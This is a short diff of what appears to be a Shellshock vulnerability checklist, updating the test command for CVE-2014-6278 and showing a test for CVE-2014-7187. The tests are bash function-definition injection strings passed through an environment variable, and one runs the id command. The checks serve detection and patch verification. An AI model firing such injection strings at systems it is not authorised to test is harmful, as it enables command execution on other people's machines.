@@ -43,7 +43,7 @@ _will create a file named echo in cwd with date in it, if vulnerable_
 + `(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"`
 
 ### CVE-2014-6278
-+ `() { _; } >_[$($())] { echo hi mom; id; }`
++ `env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :`
 + Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
 
 ### CVE-2014-6277
